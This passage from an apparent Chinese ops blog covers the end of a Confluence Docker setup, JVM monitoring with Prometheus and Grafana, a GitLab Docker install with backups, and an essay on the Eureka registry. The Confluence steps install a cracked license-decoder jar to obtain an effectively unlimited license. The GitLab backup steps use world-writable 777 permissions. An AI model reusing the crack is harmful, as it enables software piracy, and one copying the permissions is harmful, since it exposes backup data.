<h4 id="将破解后的文件复制回-confluence-容器"><a href="#将破解后的文件复制回-confluence-容器" class="headerlink" title="将破解后的文件复制回 confluence 容器"></a>将破解后的文件复制回 confluence 容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp atlassian-extras-decoder-v2-3.3.0.jar  confluence:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.3.0.jar</span><br></pre></td></tr></table></figure>

<h4 id="启动-confluence-容器"><a href="#启动-confluence-容器" class="headerlink" title="启动 confluence 容器"></a>启动 confluence 容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker start confluence</span><br></pre></td></tr></table></figure>

<h4 id="再次访问页面"><a href="#再次访问页面" class="headerlink" title="再次访问页面"></a>再次访问页面</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://ip</span><br></pre></td></tr></table></figure>

<h2 id="平台配置"><a href="#平台配置" class="headerlink" title="平台配置"></a>平台配置</h2><h4 id="输入之前复制的key后点击下一步"><a href="#输入之前复制的key后点击下一步" class="headerlink" title="输入之前复制的key后点击下一步"></a>输入之前复制的key后点击下一步</h4><p><img src="/articles/ac0d3377/6.png" alt></p>
<h4 id="点击-”My-own-database“-后点击-next"><a href="#点击-”My-own-database“-后点击-next" class="headerlink" title="点击 ”My own database“ 后点击 next"></a>点击 ”My own database“ 后点击 next</h4><p><img src="/articles/ac0d3377/Docker%E4%B8%AD%E5%AE%89%E8%A3%85Wiki%E8%BD%AF%E4%BB%B6Confluence%5C7.png" alt></p>
<h4 id="输入数据库连接信息，用户名密码是之前创建数据库中的用户名和密码"><a href="#输入数据库连接信息，用户名密码是之前创建数据库中的用户名和密码" class="headerlink" title="输入数据库连接信息，用户名密码是之前创建数据库中的用户名和密码"></a>输入数据库连接信息，用户名密码是之前创建数据库中的用户名和密码</h4><p>注意：用户名为 postgres没有db</p>
<p><img src="/articles/ac0d3377/8.png" alt></p>
<h4 id="单击-”Empty-Site“"><a href="#单击-”Empty-Site“" class="headerlink" title="单击 ”Empty Site“"></a>单击 ”Empty Site“</h4><p><img src="/articles/ac0d3377/9.png" alt></p>
<h4 id="点击-“Manage-users-and-groups-within-Confluence”"><a href="#点击-“Manage-users-and-groups-within-Confluence”" class="headerlink" title="点击 “Manage users and groups within Confluence”"></a>点击 “Manage users and groups within Confluence”</h4><p><img src="/articles/ac0d3377/10.png" alt></p>
<h4 id="填入管理员信息后点击-“next”"><a href="#填入管理员信息后点击-“next”" class="headerlink" title="填入管理员信息后点击 “next”"></a>填入管理员信息后点击 “next”</h4><p><img src="/articles/ac0d3377/11.png" alt></p>
<h4 id="点击-”start“"><a href="#点击-”start“" class="headerlink" title="点击 ”start“"></a>点击 ”start“</h4><p><img src="/articles/ac0d3377/12.png" alt></p>
<h4 id="设置一些信息后就完成了"><a href="#设置一些信息后就完成了" class="headerlink" title="设置一些信息后就完成了"></a>设置一些信息后就完成了</h4><p><img src="/articles/ac0d3377/13.png" alt></p>
<h4 id="查看授权信息，使用管理员用户登录"><a href="#查看授权信息，使用管理员用户登录" class="headerlink" title="查看授权信息，使用管理员用户登录"></a>查看授权信息，使用管理员用户登录</h4><p><img src="/articles/ac0d3377/14.png" alt></p>
<h4 id="可以看到是评估版本，但过期时间是3千多个月后"><a href="#可以看到是评估版本，但过期时间是3千多个月后" class="headerlink" title="可以看到是评估版本，但过期时间是3千多个月后"></a>可以看到是评估版本，但过期时间是3千多个月后</h4><p><img src="/articles/ac0d3377/15.png" alt></p>
<h2 id="解决慢时长gc的问题"><a href="#解决慢时长gc的问题" class="headerlink" title="解决慢时长gc的问题"></a>解决慢时长gc的问题</h2><p>默认java配置为1G内存使用一段时间后回经常gc造成卡顿，单击“系统信息”可以看到jvm使用情况</p>
<p><img src="/articles/ac0d3377/16.png" alt></p>
<p>进入docker容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it confluence /bin/bash # 进入docker容器 confluence</span><br></pre></td></tr></table></figure>

<p>修改java配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /opt/atlassian/confluence/bin/catalina.sh</span><br></pre></td></tr></table></figure>

<p>在 “cygwin=false” 上面添加如下内容，最大内存为2G</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS="-Xms256m -Xmx2048m -XX:PermSize=128m -XX:MaxPermSize=512m"</span><br><span class="line">或</span><br><span class="line">CATALINA_OPTS="-Xms256m -Xmx2048m -XX:PermSize=128m -XX:MaxPermSize=512m"</span><br></pre></td></tr></table></figure>

<p>重启 wiki confluence</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop confluence # 停止</span><br><span class="line">docker start confluence # 启动`</span><br></pre></td></tr></table></figure>

<p>这时候可以看到内存为 2G 可用为 73%</p>
<p><img src="/articles/ac0d3377/17.png" alt></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Prometheus+Grafana监控JVM</title>
    <url>/articles/fd3e6049.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>工具：</p>
<ul>
<li>Docker，本文大量使用了Docker来启动各个应用。</li>
<li><a href="https://prometheus.io/" target="_blank" rel="noopener">Prometheus</a>，负责抓取/存储指标信息，并提供查询功能。</li>
<li><a href="https://grafana.com/" target="_blank" rel="noopener">Grafana</a>，负责数据可视化。</li>
<li><a href="https://github.com/prometheus/jmx_exporter" target="_blank" rel="noopener">JMX exporter</a>，提供JMX中和JVM相关的metrics。</li>
<li>Tomcat，用来模拟一个Java应用。</li>
</ul>
<p>步骤：</p>
<ol>
<li>利用<a href="https://github.com/prometheus/jmx_exporter" target="_blank" rel="noopener">JMX exporter</a>，在Java进程内启动一个小型的Http server</li>
<li>配置<a href="https://prometheus.io/" target="_blank" rel="noopener">Prometheus</a>抓取那个Http server提供的metrics。</li>
<li>配置<a href="https://grafana.com/" target="_blank" rel="noopener">Grafana</a>连接<a href="https://prometheus.io/" target="_blank" rel="noopener">Prometheus</a>，配置Dashboard。</li>
</ol>
<a id="more"></a>

<h2 id="启动Java测试实例"><a href="#启动Java测试实例" class="headerlink" title="启动Java测试实例"></a>启动Java测试实例</h2><p>1) 新建一个目录，名字叫做<code>prom-jvm-demo</code>。</p>
<p>2) <a href="https://repo1.maven.org/maven2/io/prometheus/jmx/jmx_prometheus_javaagent/0.3.1/jmx_prometheus_javaagent-0.3.1.jar" target="_blank" rel="noopener">下载JMX exporter</a>到这个目录</p>
<p>3) 新建一个文件<code>simple-config.yml</code>内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">lowercaseOutputLabelNames:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">lowercaseOutputName:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">whitelistObjectNames:</span> <span class="string">["java.lang:type=OperatingSystem"]</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="attr"> - pattern:</span> <span class="string">'java.lang&lt;type=OperatingSystem&gt;&lt;&gt;((?!process_cpu_time)\w+):'</span></span><br><span class="line"><span class="attr">   name:</span> <span class="string">os_$1</span></span><br><span class="line"><span class="attr">   type:</span> <span class="string">GAUGE</span></span><br><span class="line"><span class="attr">   attrNameSnakeCase:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>4) 运行以下命令启动3个Tomcat，记得把<code>&lt;path-to-prom-jvm-demo&gt;</code>替换成正确的路径：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name tomcat-1 \</span><br><span class="line">  -v &lt;path-to-prom-jvm-demo&gt;:/jmx-exporter \</span><br><span class="line">  -e CATALINA_OPTS="-Xms64m -Xmx128m -javaagent:/jmx-exporter/jmx_prometheus_javaagent-0.3.1.jar=6060:/jmx-exporter/simple-config.yml" \</span><br><span class="line">  -p 6060:6060 \</span><br><span class="line">  -p 8080:8080 \</span><br><span class="line">  tomcat:8.5-alpine</span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">  --name tomcat-2 \</span><br><span class="line">  -v &lt;path-to-prom-jvm-demo&gt;:/jmx-exporter \</span><br><span class="line">  -e CATALINA_OPTS="-Xms64m -Xmx128m -javaagent:/jmx-exporter/jmx_prometheus_javaagent-0.3.1.jar=6060:/jmx-exporter/simple-config.yml" \</span><br><span class="line">  -p 6061:6060 \</span><br><span class="line">  -p 8081:8080 \</span><br><span class="line">  tomcat:8.5-alpine</span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">  --name tomcat-3 \</span><br><span class="line">  -v &lt;path-to-prom-jvm-demo&gt;:/jmx-exporter \</span><br><span class="line">  -e CATALINA_OPTS="-Xms64m -Xmx128m -javaagent:/jmx-exporter/jmx_prometheus_javaagent-0.3.1.jar=6060:/jmx-exporter/simple-config.yml" \</span><br><span class="line">  -p 6062:6060 \</span><br><span class="line">  -p 8082:8080 \</span><br><span class="line">  tomcat:8.5-alpine</span><br></pre></td></tr></table></figure>

<p>5) 访问<code>http://localhost:8080|8081|8082</code>看看Tomcat是否启动成功。</p>
<p>6) 访问对应的<code>http://localhost:6060|6061|6062</code>看看JMX exporter提供的metrics。</p>
<p>备注：这里提供的<code>simple-config.yml</code>仅仅提供了JVM的信息，更复杂的配置请参考<a href="https://github.com/prometheus/jmx_exporter" target="_blank" rel="noopener">JMX exporter文档</a>。</p>
<h2 id="启动Prometheus"><a href="#启动Prometheus" class="headerlink" title="启动Prometheus"></a>启动Prometheus</h2><p>1) 在之前新建目录<code>prom-jvm-demo</code>，新建一个文件<code>prom-jmx.yml</code>，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">scrape_configs:</span></span><br><span class="line"><span class="attr">  - job_name:</span> <span class="string">'java'</span></span><br><span class="line"><span class="attr">    scrape_interval:</span> <span class="number">30</span><span class="string">s</span></span><br><span class="line"><span class="attr">    static_configs:</span></span><br><span class="line"><span class="attr">    - targets:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">'&lt;host-ip&gt;:6060'</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">'&lt;host-ip&gt;:6061'</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">'&lt;host-ip&gt;:6062'</span></span><br></pre></td></tr></table></figure>

<p>2) 启动Prometheus：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name=prometheus \</span><br><span class="line">  -p 9090:9090 \</span><br><span class="line">  -v &lt;path-to-prom-jvm-demo&gt;:/prometheus-config \</span><br><span class="line">  prom/prometheus --config.file=/prometheus-config/prom-jmx.yml</span><br></pre></td></tr></table></figure>

<p>3) 访问<a href="http://localhost:9090/" target="_blank" rel="noopener">http://localhost:9090</a>看看Prometheus是否启动成功，在输入框里输入<code>jvm_info</code>然后执行，应该可以看到如下图的结果：</p>
<p><img src="/articles/fd3e6049/1.png" alt></p>
<p>如果没有看到三个instance，那么等一会儿再试。</p>
<h2 id="启动Grafana"><a href="#启动Grafana" class="headerlink" title="启动Grafana"></a>启动Grafana</h2><p>1) 启动Grafana：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name=grafana -p 3000:3000 grafana/grafana</span><br></pre></td></tr></table></figure>

<p>2) 访问<a href="http://localhost:3000/" target="_blank" rel="noopener">http://localhost:3000</a>，使用<code>admin/admin</code>登录。</p>
<p>3) 添加Prometheus数据源，如下图所示到添加数据源页面：</p>
<p><img src="/articles/fd3e6049/2.png" alt></p>
<p>4) 配置数据源信息：</p>
<ul>
<li>Name：随便取</li>
<li>Type：Prometheus</li>
<li>URL：<code>http://&lt;host-ip&gt;:9090</code></li>
<li>其余不要设置，点击<code>Save &amp; Test</code>，应该会返回成功结果</li>
</ul>
<p>5) 导入Dashboard。我们不需要重头自己做Dashboard，用现成的就行，按下图所示进入导入页面</p>
<p><img src="/articles/fd3e6049/3.png" alt></p>
<p>6) 使用我制作的<a href="https://grafana.com/dashboards/8563" target="_blank" rel="noopener">JVM Dashboard</a>，页面右侧出现的ID号是<code>8563</code>，记住这个号，填在如下图所示的位置：</p>
<p><img src="/articles/fd3e6049/4.png" alt></p>
<p>7) 然后鼠标点击别处稍等一下，出现下图，选择一下数据源就可以了</p>
<p><img src="/articles/fd3e6049/5.png" alt></p>
<p>8) 最后打开刚刚导入的Dashboard，如下图：</p>
<p><img src="/articles/fd3e6049/6.png" alt></p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Prometheus</category>
      </categories>
      <tags>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title>gitlab安装配置手册(Docker版)</title>
    <url>/articles/87b11c95.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>使用Docker容器来快速安装配置和使用的gitlab</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hub.docker.com/r/twang2218/gitlab-ce-zh/" target="_blank" rel="noopener">gitlab官网镜像</a></p>
<a id="more"></a>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构建外挂目录</span></span><br><span class="line"><span class="string">mkdir</span> <span class="bullet">-p</span> <span class="string">/data/gitlab/&#123;config,logs,data&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑docker-compose.yml</span></span><br><span class="line"><span class="comment"># 其中访问ip,访问port,ssh_port根据自己情况，自己替换</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    web:</span></span><br><span class="line"><span class="attr">      image:</span> <span class="string">'twang2218/gitlab-ce-zh:10.5'</span></span><br><span class="line"><span class="attr">      container_name:</span> <span class="string">sungitlab</span></span><br><span class="line"><span class="attr">      restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">      hostname:</span> <span class="string">'访问ip'</span></span><br><span class="line"><span class="attr">      environment:</span></span><br><span class="line"><span class="attr">        TZ:</span> <span class="string">'Asia/Shanghai'</span></span><br><span class="line"><span class="attr">        GITLAB_OMNIBUS_CONFIG:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          external_url 'http://访问ip:访问port'</span></span><br><span class="line"><span class="string">          gitlab_rails['gitlab_shell_ssh_port'] = ssh_port</span></span><br><span class="line"><span class="string">          unicorn['port'] = 8888</span></span><br><span class="line"><span class="string">          nginx['listen_port'] = 8080</span></span><br><span class="line"><span class="string"></span><span class="attr">      ports:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">'访问port:8080'</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">'8443:443'</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">'ssh_port:22'</span></span><br><span class="line"><span class="attr">      volumes:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/data/gitlab/config:/etc/gitlab</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/data/gitlab/data:/var/opt/gitlab</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/data/gitlab/logs:/var/log/gitlab</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="string">docker-compost</span> <span class="string">up</span> <span class="bullet">-d</span></span><br></pre></td></tr></table></figure>

<h2 id="配置优化"><a href="#配置优化" class="headerlink" title="配置优化"></a>配置优化</h2><h4 id="限制worker进程数"><a href="#限制worker进程数" class="headerlink" title="限制worker进程数"></a><strong>限制worker进程数</strong></h4><p>默认配置中，worker进程数与本机CPU个数一致，会大量占用内存，导致容器的内存持续增长，直至服务宕机，报5xx</p>
<p>解决方案：修改/data/gitlab/config/gitlab.rb中配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###############################################################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># GitLab Unicorn</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#! Tweak unicorn settings.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#! Docs: https://docs.gitlab.com/omnibus/settings/unicorn.html</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###############################################################################</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> unicorn[<span class="string">'worker_timeout'</span>] = 60</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##! Minimum worker_processes is 2 at this moment</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##! See https://gitlab.com/gitlab-org/gitlab-ce/issues/18771</span></span></span><br><span class="line">unicorn['worker_processes'] = 2 # 去除原注释，指定worker数和分配的CPU个数一致</span><br></pre></td></tr></table></figure>

<p><strong>然后重启</strong></p>
<h4 id="启用邮件通知"><a href="#启用邮件通知" class="headerlink" title="启用邮件通知"></a>启用邮件通知</h4><p>编辑 /data/gitlab/config/gitlab.rb</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">……之前配置略……</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Email Settings</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gitlab_rails[<span class="string">'gitlab_email_enabled'</span>] = <span class="literal">true</span></span></span><br><span class="line">gitlab_rails['gitlab_email_from'] = 'xxxxx'</span><br><span class="line"><span class="meta">#</span><span class="bash"> gitlab_rails[<span class="string">'gitlab_email_display_name'</span>] = <span class="string">'xxxxx'</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gitlab_rails[<span class="string">'gitlab_email_reply_to'</span>] = <span class="string">'noreply@example.com'</span></span></span><br><span class="line">gitlab_rails['gitlab_email_subject_suffix'] = '[xxx.gitlab]'</span><br><span class="line">……</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## GitLab email server settings</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##! Docs: https://docs.gitlab.com/omnibus/settings/smtp.html</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##! **Use smtp instead of sendmail/postfix.**</span></span></span><br><span class="line">gitlab_rails['smtp_enable'] = true</span><br><span class="line">gitlab_rails['smtp_address'] = "xxxx"</span><br><span class="line">gitlab_rails['smtp_port'] = 25</span><br><span class="line">gitlab_rails['smtp_user_name'] = "xxxxx"</span><br><span class="line">gitlab_rails['smtp_password'] = "xxxxx"</span><br><span class="line"><span class="meta">#</span><span class="bash"> gitlab_rails[<span class="string">'smtp_domain'</span>] = <span class="string">"xxxxx"</span></span></span><br><span class="line">gitlab_rails['smtp_authentication'] = "login"</span><br><span class="line">gitlab_rails['smtp_enable_starttls_auto'] = true</span><br><span class="line"><span class="meta">#</span><span class="bash"> gitlab_rails[<span class="string">'smtp_tls'</span>] = <span class="literal">false</span></span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h4 id="备份操作"><a href="#备份操作" class="headerlink" title="备份操作"></a>备份操作</h4><h6 id="Gitlab的备份目录路径设置"><a href="#Gitlab的备份目录路径设置" class="headerlink" title="Gitlab的备份目录路径设置"></a><strong>Gitlab的备份目录路径设置</strong></h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /data/gitlab/config/gitlab.rb</span><br><span class="line"></span><br><span class="line">gitlab_rails['manage_backup_path'] = true</span><br><span class="line">gitlab_rails['backup_path'] = "/data/gitlab/backups"   //gitlab备份目录</span><br><span class="line">gitlab_rails['backup_archive_permissions'] = 0644      //生成的备份文件权限</span><br><span class="line">gitlab_rails['backup_keep_time'] = 7776000             //备份保留天数为3个月（即90天，这里是7776000秒）</span><br><span class="line"></span><br><span class="line">mkdir -p /data/gitlab/backups</span><br><span class="line">chown -R git.git /data/gitlab/backups</span><br><span class="line">chmod -R 777 /data/gitlab/backups</span><br><span class="line"></span><br><span class="line">gitlab-ctl reconfigure  #重新加载配置</span><br></pre></td></tr></table></figure>

<h6 id="GItlab备份操作"><a href="#GItlab备份操作" class="headerlink" title="GItlab备份操作"></a><strong>GItlab备份操作</strong></h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 手动备份</span></span><br><span class="line">cd /data/gitlab/backups/</span><br><span class="line">gitlab-rake gitlab:backup:create</span><br><span class="line"><span class="meta">#</span><span class="bash">上面步骤是自动备份，查看备份文件</span></span><br><span class="line">ll </span><br><span class="line">-rw-r--r-- 1 git git 245760 Nov 12 15:33 1510472027_2017_11_12_9.4.5_gitlab_backup.tar</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">自动备份</span></span><br><span class="line">cd /data/gitlab/backups/</span><br><span class="line"><span class="meta">#</span><span class="bash">编写备份脚本</span></span><br><span class="line">vim gitlab_backup.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">/usr/bin/gitlab-rake gitlab:backup:create CRON=1</span><br><span class="line"></span><br><span class="line">注意：环境变量CRON=1的作用是如果没有任何错误发生时， 抑制备份脚本的所有进度输出</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">编写备份脚本，结合crontab实施自动定时备份，比如每天0点、6点、12点、18点各备份一次</span></span><br><span class="line">0 0,6,12,18 * * * /bin/bash -x /data/gitlab/backups/gitlab_backup.sh &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="恢复操作"><a href="#恢复操作" class="headerlink" title="恢复操作"></a>恢复操作</h4><p>注意：GItlab只能还原到与备份文件相同的gitlab版本。</p>
<h6 id="停止相关数据连接服务"><a href="#停止相关数据连接服务" class="headerlink" title="停止相关数据连接服务"></a>停止相关数据连接服务</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl stop unicorn</span><br><span class="line">gitlab-ctl stop sidekiq</span><br><span class="line">gitlab-ctl status</span><br></pre></td></tr></table></figure>

<h6 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入目录</span></span><br><span class="line">cd /data/gitlab/backups</span><br><span class="line"><span class="meta">#</span><span class="bash">查看备份</span></span><br><span class="line">ll</span><br><span class="line">-rw-r--r-- 1 git git 245760 Nov 12 15:33 1510472027_2017_11_12_9.4.5_gitlab_backup.tar</span><br><span class="line"><span class="meta">#</span><span class="bash">Gitlab的恢复操作会先将当前所有的数据清空，然后再根据备份数据进行恢复</span></span><br><span class="line">gitlab-rake gitlab:backup:restore BACKUP=1510472027_2017_11_12_9.4.5</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">gitlab-ctl start</span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证检查</span></span><br><span class="line">gitlab-rake gitlab:check SANITIZE=true</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务架构系列思考&lt;三&gt;</title>
    <url>/articles/32a029fb.html</url>
    <content><![CDATA[<h2 id="问题起源"><a href="#问题起源" class="headerlink" title="问题起源"></a>问题起源</h2><p>Spring Cloud微服务架构体系中，Eureka是一个至关重要的组件，它扮演着微服务注册中心的角色，所有的服务注册与服务发现，都是依赖Eureka的。</p>
<p>之前不少初学Spring Cloud的朋友在落地公司的生产环境部署时，经常会有一个疑问：Eureka Server到底要部署几台机器？</p>
<p>我们的系统那么多服务，到底会对Eureka Server产生多大的访问压力？Eureka Server能不能抗住一个大型系统的访问压力？</p>
<p>你现在心里一定很多疑问，别着急，咱们这就去探索一下，Eureka作为微服务注册中心的核心原理。下面这些问题，大伙儿先看看，有个大概的印象。</p>
<p>带着这些问题，来看后面的内容，效果更佳。</p>
<p>● Eureka注册中心使用什么样的方式来储存各个服务注册时发送过来的机器地址和端口号？</p>
<p>● 各个服务找Eureka Server拉取注册表的时候，是什么样的频率？</p>
<p>● 各个服务是如何拉取注册表的？</p>
<p>● 对于一个有几百个服务，部署上千台机器的大型分布式系统来说，这套系统会对Eureka Server造成多大的访问压力？</p>
<p>● Eureka Server从技术层面是如何抗住日千万级访问量的？</p>
 <a id="more"></a>

<p>先给大家说一个基本知识点，各个服务内的Eureka Client组件，默认情况下，每隔30秒会发送一个请求到Eureka Server，来拉取最近有变化的服务信息</p>
<p>举个例子：</p>
<p>● 库存服务原本部署在1台机器上，现在扩容了，部署到了3台机器，并且均注册到了Eureka Server上。</p>
<p>● 然后订单服务的Eureka Client会每隔30秒去找Eureka Server拉取最近注册表的变化，看看其他服务的地址有没有变化。</p>
<p>除此之外，对Eureka Server一个比较常见的请求就是心跳，各个Eureka Client都会每隔30秒发送一次心跳请求到Eureka Server，通知人家说，哥们，我这个服务实例还活着！</p>
<p>如果某个Eureka Client很长时间没有发送心跳给Eureka Server，那么就说明这个服务实例已经挂了。</p>
<p>光看上面的文字，各位童鞋可能没什么印象。老规矩！咱们还是来一张图，一起来直观的感受一下这个过程。</p>
<p>过程如图所示：</p>
<p><img src="/articles/32a029fb/1.jpg" alt></p>
<h2 id="Eureka-Server设计精妙的注册表存储结构"><a href="#Eureka-Server设计精妙的注册表存储结构" class="headerlink" title="Eureka Server设计精妙的注册表存储结构"></a>Eureka Server设计精妙的注册表存储结构</h2><p>现在咱们假设你手头有一套大型的分布式系统，这套系统一共有100个服务，每个服务部署在20台机器上，机器是4核8G的标准配置。</p>
<p>这相当于什么呢？也就是说相当于你一共部署了100 * 20 = 2000个服务实例，有2000台机器。</p>
<p>而每台机器上的服务实例内部都有一个Eureka Client组件，这个Eureka Client组件每隔30秒会请求一次Eureka Server来拉取变化的注册表。</p>
<p>此外，每个服务实例上的Eureka Client都会每隔30秒发送一次心跳请求给Eureka Server。</p>
<p>那么大家算算，Eureka Server作为一个微服务注册中心，每秒钟要被请求多少次？一天要被请求多少次？</p>
<p>● 很简单，我们就按最标准的算法来算，即每个服务实例每分钟请求2次拉取注册表，每分钟请求2次发送心跳</p>
<p>● 这样的话，一个服务实例每分钟会请求4次，2000个服务实例每分钟请求8000次</p>
<p>● 换算到每秒钟，则是8000 / 60 = 133次左右，我们直接可以大概估算为Eureka Server每秒钟会被请求150次</p>
<p>● 所以，一天的话，应该就是8000 * 60 * 24 = 1152万，也就是每天千万级访问量</p>
<p> 好！经过这么一个测算，大家是否发现这里的奥秘了？</p>
<p>● 首先第一点，对于微服务注册中心这种组件，在一开始设计他这个注册表的拉取频率以及心跳发送频率的时候，就已经考虑到了一个大型系统的各个服务请求时的压力，每秒会承载多大的请求量。</p>
<p>● 所以说各个服务实例每隔30秒发起一次请求拉取变化的注册表，以及每隔30秒发送一次心跳给Eureka Server，其实这个时间安排是有他的用意的。</p>
<p>按照我们的测算，一个上百个服务，部署几千台机器的大规模系统，按照这样的一个频率请求Eureka Server，日请求量在千万级，每秒的访问量应该是固定在150次左右，即使算上其他的一些额外操作，算到每秒钟请求Eureka Server在200次~300次吧。</p>
<p>所以通过设置一个适中的拉取注册表以及发送心跳的频率，保证大规模系统里对Eureka Server的请求压力不会太大。</p>
<p>关键问题来了，Eureka Server是如何保证轻松抗住这每秒数百次请求，每天千万级请求的呢？</p>
<p>要搞清楚这个，首先得清楚人家Eureka Server到底是用什么来存储注册表的？三个字，看源码！</p>
<p>接下来咱们就一起进入Eureka的源码里一探究竟：</p>
<p> <img src="/articles/32a029fb/2.png" alt></p>
<p>● 如上图所示，图中名为registry的CocurrentHashMap，就是注册表的核心结构。看完之后忍不住先赞叹一下，真是精妙的设计！</p>
<p>● 从代码中可以看到，Eureka Server的注册表直接基于纯内存，就是在内存里维护了一个数据结构。</p>
<p>● 各个服务发起注册、服务下线、服务故障，全部会在内存里维护和更新这个注册表。</p>
<p>● 各个服务每隔30秒拉取注册表的时候，其实Eureka Server就是直接提供内存里存储的有变化的注册表数据给他们就可以了。</p>
<p>● 同样，每隔30秒发起心跳的时候，也是在这个纯内存的CocurrentHashMap数据结构里更新心跳时间。</p>
<p>一句话概括：维护注册表、拉取注册表、更新心跳时间，全部发生在内存里！这就是Eureka Server非常核心的一个点。</p>
<p>搞清楚了这一点，咱们再来分析一下这个叫做registry的东西的数据结构，大家千万别被它复杂的外表唬住了，沉下心来，一层层的分析！</p>
<p>● 首先，这个ConcurrentHashMap的key就是服务名称，比如说“inventory-service”，就是一个服务名称。</p>
<p>● 而value：Map&lt;String, Lease<instanceinfo>则代表了一个服务的多个服务实例。</instanceinfo></p>
<p>● 举个例子：比如说“inventory-service”是可以有3个服务实例的，每个服务实例部署在一台机器上</p>
<p>接下来咱们再来看里面这个小Map：</p>
<p>Map&lt;String, Lease<instanceinfo></instanceinfo></p>
<p>● 这个Map的key就是服务实例的id</p>
<p>● value是一个叫做 Lease<instanceinfo>的东西。这又是什么鬼呢？</instanceinfo></p>
<p>■ 首先说下InstanceInfo，其实啊，我们见名知义，这个InstanceInfo就代表了服务实例的具体信息，比如机器的ip地址、hostname以及端口号</p>
<p>■ 而Lease<instanceinfo>的这个Lease，里面则会维护每个服务最近一次发送心跳的时间</instanceinfo></p>
